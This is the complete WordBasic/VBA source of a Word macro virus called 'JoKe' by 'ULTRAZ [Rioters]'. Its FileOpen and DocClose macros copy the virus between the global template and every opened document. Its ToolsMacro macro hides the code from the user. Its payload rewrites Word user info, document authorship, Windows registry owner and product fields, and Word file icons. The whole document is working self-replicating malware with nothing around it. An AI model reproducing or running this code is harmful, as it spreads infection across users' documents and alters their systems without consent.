   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   On Error GoTo -1: On Error GoTo Stealth
   WordBasic.ScreenUpdating
   WordBasic.FileNew
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsMacro(False)
   WordBasic.CurValues.ToolsMacro dlg
   WordBasic.Dialog.ToolsMacro dlg
   WordBasic.FileClose 2
   WordBasic.ScreenUpdating
   WordBasic.ToolsMacro dlg
   Stealth:
   End Sub

   Attribute VB_Name = "FileOpen"

   Public Sub MAIN()
   On Error Resume Next
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
   WordBasic.CurValues.FileOpen dlg
   WordBasic.Dialog.FileOpen dlg
   WordBasic.FileOpen dlg
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "Global:JoKe", WordBasic.[WindowName$]() + ":JoKe"
   WordBasic.MacroCopy "Global:FileOpen", WordBasic.[WindowName$]() + ":FileOpen"
   WordBasic.MacroCopy "Global:DocClose", WordBasic.[WindowName$]() + ":DocClose"
   WordBasic.MacroCopy "Global:ToolsMacro", WordBasic.[WindowName$]() + ":ToolsMacro"
   WordBasic.FileSaveAll 1, 1
   WordBasic.Call "JoKe"
   End Sub

   Attribute VB_Name = "DocClose"

   Public Sub MAIN()
   On Error Resume Next
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":JoKe", "Global:JoKe"
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileOpen", "Global:FileOpen"
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":DocClose", "Global:DocClose"
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ToolsMacro", "Global:ToolsMacro"
   WordBasic.FileSaveAll 1, 0
   WordBasic.Call "JoKe"
   WordBasic.DocClose
   End Sub

   Attribute VB_Name = "JoKe"

   Public Sub MAIN()
   ' JoKe By ULTRAZ [Rioters]
   ' Greater thank you Qudan
   On Error Resume Next
   WordBasic.ToolsOptionsUserInfo Name:="ULTRAS", Initials:="Joke", Address:="ULTRAS2@usa.net"
   WordBasic.FileSummaryInfo Author:="JoKe by ULTRaS"
       WordBasic.SetPrivateProfileString "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner", "ULTRAS", ""
       WordBasic.SetPrivateProfileString "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization", "Rioters", ""
       WordBasic.SetPrivateProfileString "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "ProductName", "JoKe By ULTRaS", ""
       WordBasic.SetPrivateProfileString "HKEY_CLASSES_ROOT\WORD.DOCUMENT.6\DefaultIcon\", "", "C:\Windows\System\Shell32.dll,31", ""
       WordBasic.SetPrivateProfileString "HKEY_CLASSES_ROOT\Word.Template\DefaultIcon\", "", "C:\Windows\System\Shell32.dll,32", ""
   End Sub
